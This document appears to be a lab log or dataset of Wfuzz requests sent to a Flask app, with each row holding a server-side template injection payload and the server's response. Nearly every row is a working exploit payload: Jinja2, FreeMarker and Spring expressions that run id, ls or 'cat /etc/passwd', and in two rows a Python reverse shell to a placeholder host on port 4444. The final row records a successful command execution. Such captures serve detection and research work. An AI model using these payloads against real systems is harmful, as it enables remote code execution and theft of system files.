ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34898
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bself%7D%7D%0A,"<h2>Hey, &lt;TemplateReference None&gt;</h2> ",close,45,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34908
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,"<h2>Hey, {freemarker.template.utility.xecutenewid}</h2> ",close,56,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34910
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,"<h2>Hey, {php}echo id{php}</h2> ",close,32,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34912
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%5B%27cat%24IFS/etc/passwd%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34924
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%5B%27cat%5Cx20/etc/passwd%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34930
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%24smarty.version%7D%0A,"<h2>Hey, {smarty.version}</h2> ",close,31,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34946
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34960
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34976
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34990
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27%27.__class__.mro%28%29%5B1%5D.__subclasses__%28%29%5B396%5D%28%27cat%20/etc/passwd%27%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%5B0%5D.strip%28%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35002
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%20config.items%28%29%5B4%5D%5B1%5D.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%22/etc/passwd%22%29.read%28%29%20%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35014
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%27/etc/passwd%27%29.read%28%29%20%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35022
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,"<h2>Hey, assign ex  freemarker.template.utility.xecutenew{ exid}</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35038
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35042
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%3C%25%3D%20File.open%28%27/etc/passwd%27%29.read%20%25%3E%0A,"<h2>Hey,  ile.openetcpasswd.read </h2> ",close,39,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35084
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,"<h2>Hey, assign ex  freemarker.template.utility.xecutenew{ exid}</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35056
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%20request%20%7D%7D%0A,"<h2>Hey, &lt;Request &#39;http://192.168.1.40:5000/users?username=%7B%7B%20request%20%7D%7D%0A&#39; [GET]&gt;</h2> ",close,115,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35068
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35090
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35104
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35106
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Brequest.__class__%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35112
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35122
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35134
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35146
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35154
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35164
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35170
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35178
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,"<h2>Hey, {java.lang.untime.getuntime.execcat etcpasswd}</h2> ",close,61,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35186
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{3*'3'}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35200
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=@(6+5),"<h2>Hey,  </h2> ",close,16,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35216
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${{3*3}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35224
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${6*6},"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35226
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{3*3}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35232
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<%=%203%20*%203%20%>,"<h2>Hey,     </h2> ",close,19,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35246
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{2*2}}[[3*3]],<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35260
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,"<h2>Hey, {java.lang.ystem.getenv}</h2> ",close,39,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35262
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,"<h2>Hey, {org.apache.commons.io.tils.totringjava.lang.untime.getuntime.execjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.getnputtream}</h2> ",close,583,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35264
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=*{7*7},"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35394
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{''.__class__.mro()[1].__subclasses__()[396]('cat%20/etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35560
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20""warning""%20in%20x.__name__%20%}{{x()._module.__builtins__['__import__']('os').popen(""python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"",%20\""/etc/passwd\""]);'"").read().zfill(417)}}{%endif%}{%%20endfor%20%}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35584
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},"<h2>Hey, {org.apache.commons.io.tils.totringjava.lang.untime.getuntime.execid.getnputtream}</h2> ",close,97,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35598
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},"<h2>Hey, {org.apache.commons.io.tils.totringjava.lang.untime.getuntime.execjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.getnputtream}</h2> ",close,583,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35608
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).read()}},"<h2>Hey, DVWA-master.zip lfi log.txt wfuzz_all_attack wfuzz_bad_chars wfuzz_sql wfuzz_ssti.pcap wfuzz_xml wfuzz_xss </h2> ",close,122,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,35622
